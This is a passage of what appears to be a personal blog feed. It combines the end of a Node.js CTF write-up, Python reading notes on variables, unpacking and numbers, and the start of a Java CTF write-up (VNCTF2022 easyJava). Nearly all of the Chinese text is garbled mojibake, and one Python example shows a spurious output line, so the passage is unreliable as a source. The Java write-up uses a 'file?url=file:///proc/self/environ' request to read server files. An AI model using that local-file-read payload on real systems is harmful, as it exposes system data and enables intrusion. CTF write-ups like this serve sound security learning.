class="hljs-string">&quot;Timeout occurs&quot;</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>          res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;message&#x27;</span>, &#123;<span class="hljs-attr">message</span>: e.<span class="hljs-property">message</span>&#125;);<br>        &#125;<br>      &#125;);<br>    &#125; <span class="hljs-keyword">catch</span> (error) &#123;<br>      res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;message&#x27;</span>, &#123;<span class="hljs-attr">message</span>: <span class="hljs-string">&#x27;error&#x27;</span>&#125;);<br>    &#125;<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;message&#x27;</span>, &#123;<span class="hljs-attr">message</span>: <span class="hljs-string">&#x27;Missing url param!&#x27;</span>&#125;);<br>  &#125;<br>&#125;);<br><br><span class="hljs-comment">// é”™è¯¯å¤„ç†</span><br>app.<span class="hljs-title function_">use</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params">req, res, next</span>) &#123;<br>  <span class="hljs-title function_">next</span>(<span class="hljs-title function_">createError</span>(<span class="hljs-number">404</span>));<br>&#125;);<br><br>app.<span class="hljs-title function_">use</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params">err, req, res, next</span>) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(err)<br>  res.<span class="hljs-property">locals</span>.<span class="hljs-property">message</span> = err.<span class="hljs-property">message</span>;<br>  res.<span class="hljs-property">locals</span>.<span class="hljs-property">error</span> = req.<span class="hljs-property">app</span>.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;env&#x27;</span>) === <span class="hljs-string">&#x27;development&#x27;</span> ? err : &#123;&#125;;<br>  res.<span class="hljs-title function_">status</span>(err.<span class="hljs-property">status</span> || <span class="hljs-number">500</span>);<br>  res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;error&#x27;</span>);<br>&#125;);<br><br><span class="hljs-comment">// è¾…åŠ©å‡½æ•°ï¼Œæ£€æŸ¥ IP æ˜¯å¦ä¸ºæœ¬åœ°ä¸»æœº</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">checkIP</span>(<span class="hljs-params">req</span>) &#123;<br>  <span class="hljs-keyword">let</span> ip = req.<span class="hljs-property">connection</span>.<span class="hljs-property">remoteAddress</span>;<br>  <span class="hljs-keyword">if</span> (ip.<span class="hljs-title function_">substr</span>(<span class="hljs-number">0</span>, <span class="hljs-number">7</span>) === <span class="hljs-string">&quot;::ffff:&quot;</span>) &#123;<br>    ip = ip.<span class="hljs-title function_">substr</span>(<span class="hljs-number">7</span>)<br>  &#125;<br>  <span class="hljs-keyword">return</span> ip === <span class="hljs-string">&#x27;127.0.0.1&#x27;</span>;<br>&#125;<br><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = app;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>åšé¢˜è®°å½•</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ã€ŠPythonå·¥åŒ ã€‹è¯»ä¹¦ç¬”è®°</title>
    <link href="/2024/04/20/%E3%80%8APython%E5%B7%A5%E5%8C%A0%E3%80%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    <url>/2024/04/20/%E3%80%8APython%E5%B7%A5%E5%8C%A0%E3%80%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<p>å”‰ï¼Œå­¦</p><span id="more"></span><h2 id="å˜é‡ä¸æ³¨é‡Š"><a href="#å˜é‡ä¸æ³¨é‡Š" class="headerlink" title="å˜é‡ä¸æ³¨é‡Š"></a>å˜é‡ä¸æ³¨é‡Š</h2><h4 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h4><p>æ¯”è¾ƒä»¥ä¸‹ä¸¤è¡Œä»£ç ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># å»æ‰ s ä¸¤è¾¹çš„ç©ºæ ¼ï¼Œå†å¤„ç†</span><br>value = process(s.strip())<br><span class="hljs-comment"># ç”¨æˆ·è¾“å…¥å¯èƒ½ä¼šæœ‰ç©ºæ ¼ï¼Œä½¿ç”¨ strip() å»æ‰ç©ºæ ¼</span><br>username = extract_username(input_string.strip())<br></code></pre></td></tr></table></figure><p>å¥½çš„å˜é‡å’Œæ³¨é‡Šå¹¶éä¸ºè®¡ç®—æœºè€Œå†™ï¼Œè€Œæ˜¯ä¸ºæ¯ä¸ªé˜…è¯»ä»£ç  çš„äººè€Œå†™ï¼ˆå½“ç„¶ä¹ŸåŒ…æ‹¬ä½ è‡ªå·±ï¼‰ã€‚å˜é‡ä¸æ³¨é‡Šæ˜¯ä½œè€…è¡¨è¾¾æ€æƒ³çš„åŸºç¡€ï¼Œæ˜¯ è¯»è€…ç†è§£ä»£ç çš„ç¬¬ä¸€é“é—¨ï¼Œå®ƒä»¬å¯¹ä»£ç è´¨é‡çš„è´¡çŒ®æ¯‹åº¸ç½®ç–‘ã€‚</p><h4 id="1-1-1-å˜é‡å¸¸è§ç”¨æ³•"><a href="#1-1-1-å˜é‡å¸¸è§ç”¨æ³•" class="headerlink" title="1.1.1 å˜é‡å¸¸è§ç”¨æ³•"></a>1.1.1 å˜é‡å¸¸è§ç”¨æ³•</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>author = <span class="hljs-string">&#x27;piglei&#x27;</span><br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Hello, &#123;&#125;!&#x27;</span>.<span class="hljs-built_in">format</span>(author))<br>Hello, piglei!<br></code></pre></td></tr></table></figure><p><code>java</code>:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">author</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;piglei&quot;</span>;<br><span class="hljs-type">String</span> <span class="hljs-variable">message</span> <span class="hljs-operator">=</span> String.format(<span class="hljs-string">&quot;Hello, %s!&quot;</span>, author);<br>System.out.println(message);<br></code></pre></td></tr></table></figure><p>Python æ˜¯ä¸€é—¨åŠ¨æ€ç±»å‹çš„è¯­è¨€ï¼Œæ‰€ä»¥æˆ‘ä»¬æ— é¡»é¢„å…ˆå£°æ˜å˜é‡ç±» å‹ï¼Œç›´æ¥å¯¹å˜é‡èµ‹å€¼å³å¯ã€‚</p><p>ä¹Ÿå¯ä»¥åœ¨ä¸€è¡Œè¯­å¥é‡ŒåŒæ—¶æ“ä½œå¤šä¸ªå˜é‡ï¼Œæ¯”å¦‚è°ƒæ¢ä¸¤ä¸ªå˜é‡æ‰€æŒ‡å‘çš„å€¼ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-meta">&gt;&gt;&gt; </span>author, reader = <span class="hljs-string">&#x27;piglei&#x27;</span>, <span class="hljs-string">&#x27;raymond&#x27;</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>author, reader = reader, author<br><span class="hljs-meta">&gt;&gt;&gt; </span>author<br><span class="hljs-string">&#x27;raymond&#x27;</span><br></code></pre></td></tr></table></figure><h5 id="å˜é‡è§£åŒ…"><a href="#å˜é‡è§£åŒ…" class="headerlink" title="å˜é‡è§£åŒ…"></a>å˜é‡è§£åŒ…</h5><p>å˜é‡è§£åŒ…å…è®¸æˆ‘ä»¬ æŠŠä¸€ä¸ªå¯è¿­ä»£å¯¹è±¡ï¼ˆæ¯”å¦‚åˆ—è¡¨ï¼‰çš„æ‰€æœ‰æˆå‘˜ï¼Œä¸€æ¬¡æ€§èµ‹å€¼ç»™å¤šä¸ªå˜é‡ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-meta">&gt;&gt;&gt; </span>usernames = [<span class="hljs-string">&#x27;piglei&#x27;</span>, <span class="hljs-string">&#x27;raymond&#x27;</span>]<br><span class="hljs-comment"># æ³¨æ„ï¼šå·¦ä¾§å˜é‡çš„ä¸ªæ•°å¿…é¡»å’Œå¾…å±•å¼€çš„åˆ—è¡¨é•¿åº¦ç›¸ç­‰ï¼Œå¦åˆ™ä¼šæŠ¥é”™</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>author, reader = usernames<br><span class="hljs-meta">&gt;&gt;&gt; </span>author<br><span class="hljs-string">&#x27;piglei&#x27;</span><br><span class="hljs-comment">#æˆ–è€…ï¼š</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>attrs = [<span class="hljs-number">1</span>, [<span class="hljs-string">&#x27;piglei&#x27;</span>, <span class="hljs-number">100</span>]]<br><span class="hljs-meta">&gt;&gt;&gt; </span>user_id, (username, score) = attrs<br><span class="hljs-meta">&gt;&gt;&gt; </span>user_id<br><span class="hljs-number">1</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>username<br><span class="hljs-string">&#x27;piglei&#x27;</span><br></code></pre></td></tr></table></figure><p>åªè¦ç”¨æ˜Ÿå·è¡¨è¾¾å¼ï¼ˆ*variablesï¼‰ä½œä¸ºå˜é‡åï¼Œå®ƒä¾¿ä¼šè´ªå©ªåœ°æ•è·å¤šä¸ªå€¼å¯¹è±¡ï¼Œå¹¶å°†æ•è·åˆ°çš„å†…å®¹ä½œä¸ºåˆ—è¡¨èµ‹å€¼ç»™variablesã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>data = [<span class="hljs-string">&#x27;piglei&#x27;</span>, <span class="hljs-string">&#x27;apple&#x27;</span>, <span class="hljs-string">&#x27;orange&#x27;</span>, <span class="hljs-string">&#x27;banana&#x27;</span>, <span class="hljs-number">100</span>]<br><span class="hljs-meta">&gt;&gt;&gt; </span>username, *fruits, score = data<br><span class="hljs-number">1</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>username<br><span class="hljs-string">&#x27;piglei&#x27;</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>fruits<br>[<span class="hljs-string">&#x27;apple&#x27;</span>, <span class="hljs-string">&#x27;orange&#x27;</span>, <span class="hljs-string">&#x27;banana&#x27;</span>]<br><span class="hljs-meta">&gt;&gt;&gt; </span>score<br><span class="hljs-number">100</span><br></code></pre></td></tr></table></figure><p>å’Œå¸¸è§„çš„åˆ‡ç‰‡èµ‹å€¼è¯­å¥æ¯”èµ·æ¥ï¼ŒåŠ¨æ€è§£åŒ…è¯­æ³•è¦ç›´è§‚è®¸å¤šï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 1. åŠ¨æ€è§£åŒ…</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>username, *fruits, score = data<br><span class="hljs-comment"># 2. åˆ‡ç‰‡èµ‹å€¼</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>username, fruits, score = data[<span class="hljs-number">0</span>], data[<span class="hljs-number">1</span>:-<span class="hljs-number">1</span>], data[-<span class="hljs-number">1</span>]<br><span class="hljs-comment"># ä¸¤ç§å˜é‡èµ‹å€¼æ–¹å¼å®Œå…¨ç­‰ä»·</span><br></code></pre></td></tr></table></figure><p>å½“ç„¶ä¹Ÿå¯ä»¥åœ¨å¾ªç¯è¯­å¥ä¸­ä½¿ç”¨ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">for</span> username, score <span class="hljs-keyword">in</span> [[<span class="hljs-string">&#x27;piglei&#x27;</span>, <span class="hljs-number">100</span>], [<span class="hljs-string">&#x27;raymond&#x27;</span>, <span class="hljs-number">60</span>]]:<br><span class="hljs-meta">... </span> <span class="hljs-built_in">print</span>(username)<br>...<br>piglei<br>raymond<br></code></pre></td></tr></table></figure><h5 id="å•ä¸‹åˆ’çº¿å˜é‡å"><a href="#å•ä¸‹åˆ’çº¿å˜é‡å" class="headerlink" title="å•ä¸‹åˆ’çº¿å˜é‡å _"></a>å•ä¸‹åˆ’çº¿å˜é‡å _</h5><p>å‡å¦‚ä½ æƒ³åœ¨è§£åŒ…èµ‹å€¼æ—¶å¿½ç•¥æŸäº›å˜é‡ï¼Œå°±å¯ä»¥ä½¿ç”¨ _ ä½œä¸º å˜é‡åï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># å¿½ç•¥å±•å¼€æ—¶çš„ç¬¬äºŒä¸ªå˜é‡</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>author, _ = usernames<br><span class="hljs-comment"># å¿½ç•¥ç¬¬ä¸€ä¸ªå’Œæœ€åä¸€ä¸ªå˜é‡ä¹‹é—´çš„æ‰€æœ‰å˜é‡</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>username, *_, score = data<br></code></pre></td></tr></table></figure><h4 id="1-1-2-ç»™å˜é‡æ³¨æ˜ç±»å‹"><a href="#1-1-2-ç»™å˜é‡æ³¨æ˜ç±»å‹" class="headerlink" title="1.1.2 ç»™å˜é‡æ³¨æ˜ç±»å‹"></a>1.1.2 ç»™å˜é‡æ³¨æ˜ç±»å‹</h4><p>Python æ˜¯åŠ¨æ€ç±»å‹è¯­è¨€ï¼Œä½¿ç”¨å˜é‡æ—¶ä¸éœ€è¦åšä»»ä½•ç±»å‹å£°æ˜ã€‚ä½†ä»»ä½•äº‹ç‰©éƒ½æœ‰å…¶ä¸¤é¢æ€§ã€‚åŠ¨æ€ç±»å‹æ‰€å¸¦æ¥çš„ç¼ºç‚¹æ˜¯ä»£ç çš„å¯è¯»æ€§ä¼šå› æ­¤å¤§æ‰“æŠ˜æ‰£ã€‚</p><blockquote><p>åœ¨ Python ä¸­ï¼Œå‡½æ•°æ–‡æ¡£é€šå¸¸ç§°ä¸ºæ–‡æ¡£å­—ç¬¦ä¸²ï¼ˆdocstringï¼‰ã€‚æ–‡æ¡£å­—ç¬¦ä¸²æ˜¯åœ¨å‡½æ•°å®šä¹‰ä¸­çš„å­—ç¬¦ä¸²æ–‡å­—ï¼Œç”¨äºæè¿°å‡½æ•°çš„ç›®çš„ã€ç”¨æ³•ã€å‚æ•°å’Œè¿”å›å€¼ç­‰ä¿¡æ¯ã€‚æ–‡æ¡£å­—ç¬¦ä¸²é€šå¸¸ä½äºå‡½æ•°å®šä¹‰çš„ç¬¬ä¸€è¡Œä¸‹æ–¹ï¼Œç”¨ä¸‰é‡å¼•å·ï¼ˆå•å¼•å·æˆ–åŒå¼•å·éƒ½å¯ä»¥ï¼‰æ‹¬èµ·æ¥ã€‚</p></blockquote><p>ç±»ä¼¼è¿™ç§ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">remove_invalid</span>(<span class="hljs-params">items</span>):<br> <span class="hljs-string">&quot;&quot;&quot;å‰”é™¤ items é‡Œé¢æ— æ•ˆçš„å…ƒç´ </span><br><span class="hljs-string"> :param items: å¾…å‰”é™¤å¯¹è±¡</span><br><span class="hljs-string"> :type items: åŒ…å«æ•´æ•°çš„åˆ—è¡¨ï¼Œ[int, ...]</span><br><span class="hljs-string"> &quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure><p>ã€€åœ¨ä¸Šé¢çš„å‡½æ•°æ–‡æ¡£é‡Œï¼Œæˆ‘ç”¨ :type items: æ³¨æ˜äº† items æ˜¯ä¸ªæ•´å‹åˆ—è¡¨ã€‚ä»»ä½•äººåªè¦è¯»åˆ°è¿™ä»½æ–‡æ¡£ï¼Œé©¬ä¸Šå°±èƒ½çŸ¥é“å‚æ•°ç±»å‹ã€‚</p><p>å½“ç„¶ç°åœ¨è¿˜æœ‰ç±»å‹æ³¨è§£çš„æ–¹å¼ï¼Œæ›´åŠ æ¸…æ™°ç®€æ˜“ï¼š</p><p>â€‹è¦ä½¿ç”¨ç±»å‹æ³¨è§£ï¼Œåªéœ€åœ¨å˜é‡åæ·»åŠ ç±»å‹ï¼Œå¹¶ç”¨å†’å·éš”å¼€å³å¯ï¼Œæ¯”å¦‚ func(value: str) è¡¨ç¤ºå‡½æ•°çš„ value å‚æ•°ä¸ºå­—ç¬¦ä¸²ç±»å‹ã€‚ä¸‹é¢æ˜¯ç»™ remove_invalid() å‡½æ•°æ·»åŠ ç±»å‹æ³¨è§£åçš„æ ·å­ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> typing <span class="hljs-keyword">import</span> <span class="hljs-type">List</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">remove_invalid</span>(<span class="hljs-params">items: <span class="hljs-type">List</span>[<span class="hljs-built_in">int</span>]</span>): <br> <span class="hljs-string">&quot;&quot;&quot;å‰”é™¤ items é‡Œé¢æ— æ•ˆçš„å…ƒç´ &quot;&quot;&quot;</span><br> ... ...<br><span class="hljs-comment">#List è¡¨ç¤ºå‚æ•°ä¸ºåˆ—è¡¨ç±»å‹ï¼Œ[int] è¡¨ç¤ºé‡Œé¢çš„æˆå‘˜æ˜¯æ•´å‹</span><br></code></pre></td></tr></table></figure><h4 id="1-1-3-å˜é‡å‘½ååŸåˆ™"><a href="#1-1-3-å˜é‡å‘½ååŸåˆ™" class="headerlink" title="1.1.3 å˜é‡å‘½ååŸåˆ™"></a>1.1.3 å˜é‡å‘½ååŸåˆ™</h4><p>å¯¹äºæ™®é€šå˜é‡ï¼Œä½¿ç”¨è›‡å½¢å‘½åæ³•ï¼Œæ¯”å¦‚ max_valueï¼› å¯¹äºå¸¸é‡ï¼Œé‡‡ç”¨å…¨å¤§å†™å­—æ¯ï¼Œä½¿ç”¨ä¸‹åˆ’çº¿è¿æ¥ï¼Œæ¯”å¦‚ MAX_VALUEï¼› å¦‚æœå˜é‡æ ‡è®°ä¸ºâ€œä»…å†…éƒ¨ä½¿ç”¨â€ï¼Œä¸ºå…¶å¢åŠ ä¸‹åˆ’çº¿å‰ç¼€ï¼Œæ¯”å¦‚ <code>_local_var</code>ï¼› å½“åå­—ä¸ Python å…³é”®å­—å†²çªæ—¶ï¼Œåœ¨å˜é‡æœ«å°¾è¿½åŠ ä¸‹åˆ’çº¿ï¼Œæ¯”å¦‚ <code>class_</code>ã€‚ é™¤å˜é‡åä»¥å¤–ï¼ŒPEP 8 ä¸­è¿˜æœ‰è®¸å¤šå…¶ä»–å‘½åè§„èŒƒï¼Œæ¯”å¦‚ç±»ååº”è¯¥ä½¿ç”¨ é©¼å³°é£æ ¼ï¼ˆFooClassï¼‰ã€å‡½æ•°åº”è¯¥ä½¿ç”¨è›‡å½¢é£æ ¼ ï¼ˆbar_functionï¼‰ï¼Œç­‰ç­‰ã€‚</p><h2 id="æ•°å€¼ä¸å­—ç¬¦ä¸²"><a href="#æ•°å€¼ä¸å­—ç¬¦ä¸²" class="headerlink" title="æ•°å€¼ä¸å­—ç¬¦ä¸²"></a>æ•°å€¼ä¸å­—ç¬¦ä¸²</h2><p>åœ¨ Python é‡Œä½¿ç”¨æ•´å‹ï¼Œä½ ä¸éœ€è¦äº†è§£â€œæœ‰ç¬¦å·â€ â€œæ— ç¬¦å·â€â€œ32 ä½â€â€œ64 ä½â€è¿™äº›ä»¤äººå¤´ç–¼çš„æ¦‚å¿µã€‚ä¸è®ºå¤šå¤§çš„æ•°å­—éƒ½èƒ½ç›´æ¥ç”¨ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># æ— ç¬¦å· 64 ä½æ•´å‹çš„æœ€å¤§å€¼ï¼ˆunsigned int64ï¼‰</span><br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-number">2</span> ** <span class="hljs-number">64</span> - <span class="hljs-number">1</span><br><span class="hljs-number">18446744073709551615</span><br><span class="hljs-comment"># ç›´æ¥ä¹˜ä¸Š 10000 ä¹Ÿæ²¡é—®é¢˜ï¼Œæ°¸ä¸æº¢å‡ºï¼</span><br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-number">18446744073709551615</span> * <span class="hljs-number">10000</span><br><span class="hljs-number">184467440737095516150000</span><br></code></pre></td></tr></table></figure><p>å’Œæ•°å­—ä¸€æ ·ï¼ŒPython é‡Œçš„å­—ç¬¦ä¸²ï¼ˆstringï¼‰ä¹Ÿå¾ˆå®¹æ˜“ä¸Šæ‰‹ ã€‚å®ƒç›´æ¥å…¼å®¹æ‰€æœ‰çš„ Unicode å­—ç¬¦ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>s = <span class="hljs-string">&#x27;Hello, ä¸­æ–‡&#x27;</span><br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">type</span>(s)<br>&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;str&#x27;</span>&gt;<br><span class="hljs-comment"># æ‰“å°ä¸­æ–‡</span><br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">print</span>(s)<br>Hello, ä¸­æ–‡<br></code></pre></td></tr></table></figure><h4 id="2-1-1-æ•°å€¼åŸºç¡€"><a href="#2-1-1-æ•°å€¼åŸºç¡€" class="headerlink" title="2.1.1 æ•°å€¼åŸºç¡€"></a>2.1.1 æ•°å€¼åŸºç¡€</h4><p>åœ¨ Python ä¸­ï¼Œä¸€å…±å­˜åœ¨ä¸‰ç§å†…ç½®æ•°å€¼ç±»å‹ï¼šæ•´å‹ï¼ˆintï¼‰ã€æµ®ç‚¹å‹ ï¼ˆfloatï¼‰å’Œå¤æ•°ç±»å‹ï¼ˆcomplexï¼‰:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># å®šä¹‰ä¸€ä¸ªæ•´å‹</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>score = <span class="hljs-number">100</span><br><span class="hljs-comment"># å®šä¹‰ä¸€ä¸ªæµ®ç‚¹å‹</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>temp = <span class="hljs-number">37.2</span><br><span class="hljs-comment"># å®šä¹‰ä¸€ä¸ªå¤æ•°</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>com = <span class="hljs-number">1</span>+<span class="hljs-number">2j</span><br></code></pre></td></tr></table></figure><p>int ä¸ floatä¹‹é—´å¯ä»¥é€šè¿‡å„è‡ªçš„å†…ç½®æ–¹æ³•è¿›è¡Œè½¬æ¢ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># å°†æµ®ç‚¹æ•°è½¬æ¢ä¸ºæ•´å‹</span><br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">int</span>(temp)<br><span class="hljs-number">37</span><br><span class="hljs-comment"># å°†æ•´å‹è½¬æ¢ä¸ºæµ®ç‚¹å‹</span><br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">float</span>(score)<br><span class="hljs-number">100.0</span><br></code></pre></td></tr></table></figure><p>å¦‚æœæ•°å­—ç‰¹åˆ«é•¿ï¼Œå¯ä»¥æ’å…¥ _ åˆ†éš”ç¬¦ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># ä»¥&quot;åƒ&quot;ä¸ºå•ä½åˆ†éš”æ•°å­—</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>i = <span class="hljs-number">1_000_000</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>i + <span class="hljs-number">10</span><br><span class="hljs-number">1000010</span><br></code></pre></td></tr></table></figure><p>æµ®ç‚¹æ•°ç²¾åº¦é—®é¢˜:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-number">0.1</span> + <span class="hljs-number">0.2</span><br><span class="hljs-number">0.30000000000000004</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>å­¦ä¹ ç¬”è®°</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>æœ€è¿‘åšçš„å‡ é“javaé¢˜</title>
    <link href="/2024/04/20/%E6%9C%80%E8%BF%91%E5%81%9A%E7%9A%84%E5%87%A0%E9%81%93java%E9%A2%98/"/>
    <url>/2024/04/20/%E6%9C%80%E8%BF%91%E5%81%9A%E7%9A%84%E5%87%A0%E9%81%93java%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<p>å‡ é“javaé¢˜</p><span id="more"></span><h2 id="VNCTF2022å…¬å¼€èµ›-easyJava"><a href="#VNCTF2022å…¬å¼€èµ›-easyJava" class="headerlink" title="[VNCTF2022å…¬å¼€èµ›]easyJava"></a>[VNCTF2022å…¬å¼€èµ›]easyJava</h2><p>å³é”®çœ‹æºç ï¼Œæç¤ºäº†<code>&lt;!-- /file? --&gt;</code></p><p><code>get</code>ä¼ å‚<code>url</code>ï¼Œæ¯”å¦‚ï¼š</p><p><code>file?url=file:///</code>æ˜¾ç¤ºæ ¹ç›®å½•ä¸‹çš„æ–‡ä»¶ï¼š</p><p><img src="/img/ezjava1.png" alt="ezjava1"></p><p>æ²¡æ³•ç›´æ¥è¯»<code>flag</code>ï¼Œç›´æ¥åˆ©ç”¨<code>file?url=file:///proc/self/environ</code>çœ‹å½“å‰å·¥ä½œç›®å½•ï¼š</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-variable constant_">PWD</span><span class="hljs-symbol">:/usr/local/tomcat</span><br></code></pre></td></tr></table></figure><p>åé¢å°±æ˜¯è¯»å“åº”æ–‡ä»¶äº†ï¼Œè§£é¢˜éœ€è¦çš„ä¸¤ä¸ª<code>class</code>æ–‡ä»¶ä¸­æ¯”è¾ƒé‡è¦çš„éƒ¨åˆ†ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span 